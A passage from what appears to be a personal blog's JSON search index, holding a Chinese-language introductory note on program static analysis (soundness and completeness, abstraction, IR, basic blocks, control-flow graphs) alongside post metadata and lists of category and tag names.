同一目标：safe-approximation","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"静态分析基础","slug":"静态分析基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"}]},{"title":"静态分析入门笔记01","slug":"静态分析入门笔记01","date":"2020-03-24T05:43:08.000Z","updated":"2020-04-27T13:35:44.933Z","comments":true,"path":"静态分析入门笔记01/","link":"","permalink":"https://0range228.github.io/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/","excerpt":"序言 男儿何不带吴钩，收取关山五十州。 从这篇文章开始，我会在我的博客中记录学习程序静态分析的点点滴滴，我也会把在疫情期间，自己在家中学习的成果和收获上传到我的博客，记录自己的点滴进步。","text":"序言 男儿何不带吴钩，收取关山五十州。 从这篇文章开始，我会在我的博客中记录学习程序静态分析的点点滴滴，我也会把在疫情期间，自己在家中学习的成果和收获上传到我的博客，记录自己的点滴进步。 PL？程序分析？PL的三大模块 理论部分 程序是如何设计的 语言的类型系统 语言的形式语义与逻辑系统 支撑环境 编译器：对语言语法的解析，字节码转换等 运行时系统：Java，Python等，JVM虚拟机，内存分配，管理 语言应用 程序分析 程序验证 程序合成：例如如何自动生成一个程序 语言核心核心无非分为三类： 命令式语言Imperative language：Java，C/C++等 把程序逻辑拆解成一条条指令，加载到内存，顺序执行下来。 函数式语言Functional language：Pascal，JS，Python 命令式与函数式相结合，把逻辑包装起来，形式化。 逻辑式语言Prolog： 声明，逻辑，与、或、非。 语言核心没有变，用语言写的程序变得复杂了。 #静态分析 定义 在程序运行前，在编译时刻就完成程序安全性，可靠性的检验。不用运行程序本身，就能检查出程序潜在的问题。 程序运行时会不会有隐私泄露？ 空指针引用异常？ cast安全吗？ v1，v2两个变量会不会造成内存竞争？要不要加锁？ assert运行时会不会fail掉？ dead code？ Rice’s Theorem 程序分析不存在 exact answer 正常的递归可枚举语言，不存在某个方法，可以去判断其是否存在问题。 Sound &amp; Complete Sound &gt; Truth &gt; Complete Sound：Overapproximate，肯定会包含Truth。 假如Truth就是代表有10个空指针异常，那么Sound可以有1k，1w个空指针异常，就是包含Truth的关系。 Complete：Underapproximate，一定在Truth里面。 上一个例子，无论Complete里面有几个空指针异常，只要存在的，就一定在Truth里面，是Truth子集的关系。 Useful static analysis 妥协Soundness：会产生【漏报】，False Negatives 妥协Completeness：会产生【误报】，False Positives 但是在绝大部分的静态分析中，绝大部分都【妥协Completeness】。 宁可误报，也不要漏报！ 准则在保证soundness的基础上，在【精度】和【速度】上作出权衡。 抽象+近似 抽象：判断变量的+/—/0符号。 近似：在抽象的基础上进行近似。 Transfer function Control flows Concrete Domain ——&gt; Abstract Domain 不关心是具体数值，关心变量的符号位。 Transfer function： 在静态分析中，transfer fuction主要应用在于如何在程序语句的抽象值上进行运算。 根据你分析的程序的目标，和程序中每一个语句的语义，综合地设计分析方法。 Control flows： 控制流，就是程序执行的流。控制流图，程序如何跳转。 IR (Intermediate representation)Compiler &amp; Analysis Compiler: 需要将人写的高级代码，【编译】成机器可以看懂的机器码。 在这个过程中，编译器做的工作不仅有【翻译】，还会有【检查】。 AST vs. IR: 3AC3AC：三地址码。a = b + c Control Flow AnalysisBasic Blocks最大的、连续的、3AC指令块。 有且只有一个入口，并且是第一行指令是入口。 出口也是唯一的，是最后一个指令。 如何划分BB？ 首先决定BB入口在哪： 程序中的第一行语句。 无条件跳转的目标语句也是入口。 紧接着条件/无条件跳转的语句也是个BB入口。 有了BB入口，接下来： 有了入口，那么整个BB包含入口开始的连续语句，直到下一个leader的位置。 CFG控制流图。 控制流图的node其实就是BB代码块。","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"静态分析基础","slug":"静态分析基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"}]},{"title":"Life","slug":"Life","date":"2019-11-04T08:49:06.000Z","updated":"2020-03-27T12:05:36.131Z","comments":true,"path":"Life/","link":"","permalink":"https://0range228.github.io/Life/","excerpt":"#Make it better.","text":"#Make it better.","categories":[],"tags":[{"name":"new begin","slug":"new-begin","permalink":"https://0range228.github.io/tags/new-begin/"}]}],"categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"},{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"},{"name":"工具","slug":"工具","permalink":"https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"},{"name":"Java代码审计","slug":"Java代码审计","permalink":"https://0range228.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"IDE","slug":"IDE","permalink":"https://0range228.github.io/categories/IDE/"},{"name":"基础工具","slug":"基础工具","permalink":"https://0range228.github.io/categories/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7/"},{"name":"Shell","slug":"Shell","permalink":"https://0range228.github.io/categories/Shell/"},{"name":"图数据库","slug":"图数据库","permalink":"https://0range228.github.io/categories/%E5%9B%BE%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"源码分析","slug":"源码分析","permalink":"https://0range228.github.io/categories/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"name":"污点分析","slug":"污点分析","permalink":"https://0range228.github.io/categories/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"},{"name":"Papers","slug":"Papers","permalink":"https://0range228.github.io/categories/Papers/"},{"name":"Linux","slug":"Linux","permalink":"https://0range228.github.io/categories/Linux/"}],"tags":[{"name":"shiro","slug":"shiro","permalink":"https://0range228.github.io/tags/shiro/"},{"name":"Java序列化原理","slug":"Java序列化原理","permalink":"https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"},{"name":"XStream","slug":"XStream","permalink":"https://0range228.github.io/tags/XStream/"},{"name":"静态分析理论基础","slug":"静态分析理论基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"},{"name":"shell","slug":"shell","permalink":"https://0range228.github.io/tags/shell/"},{"name":"Docker","slug":"Docker","permalink":"https://0range228.github.io/tags/Docker/"},{"name":"实战记录","slug":"实战记录","permalink":"https://0range228.github.io/tags/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"Java基础","slug":"Java基础","permalink":"https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"Soot","slug":"Soot","permalink":"https://0range228.github.io/tags/Soot/"},{"name":"JVM","slug":"JVM","permalink":"https://0range228.github.io/tags/JVM/"},{"name":"IDEA","slug":"IDEA","permalink":"https://0range228.github.io/tags/IDEA/"},{"name":"Git","slug":"Git","permalink":"https://0range228.github.io/tags/Git/"},{"name":"Javassist","slug":"Javassist","permalink":"https://0range228.github.io/tags/Javassist/"},{"name":"Java Agent","slug":"Java-Agent","permalink":"https://0range228.github.io/tags/Java-Agent/"},{"name":"JFR","slug":"JFR","permalink":"https://0range228.github.io/tags/JFR/"},{"name":"iTerm2","slug":"iTerm2","permalink":"https://0range228.github.io/tags/iTerm2/"},{"name":"Neo4j","slug":"Neo4j","permalink":"https://0range228.github.io/tags/Neo4j/"},{"name":"GadgetInspector","slug":"GadgetInspector","permalink":"https://0range228.github.io/tags/GadgetInspector/"},{"name":"ClassLoader","slug":"ClassLoader","permalink":"https://0range228.github.io/tags/ClassLoader/"},{"name":"静态分析基础","slug":"静态分析基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"},{"name":"污点分析基础","slug":"污点分析基础","permalink":"https://0range228.github.io/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"},{"name":"ASM","slug":"ASM","permalink":"https://0range228.github.io/tags/ASM/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://0range228.github.io/tags/Fastjson/"},{"name":"JNDI","slug":"JNDI","permalink":"https://0range228.github.io/tags/JNDI/"},{"name":"RMI","slug":"RMI","permalink":"https://0range228.github.io/tags/RMI/"},{"name":"Java反射","slug":"Java反射","permalink":"https://0range228.github.io/tags/Java%E5%8F%8D%E5%B0%84/"},{"name":"Java动态代理","slug":"Java动态代理","permalink":"https://0range228.github.io/tags/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://0range228.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"new begin","slug":"new-begin","permalink":"https://0range228.github.io/tags/new-begin/"}]}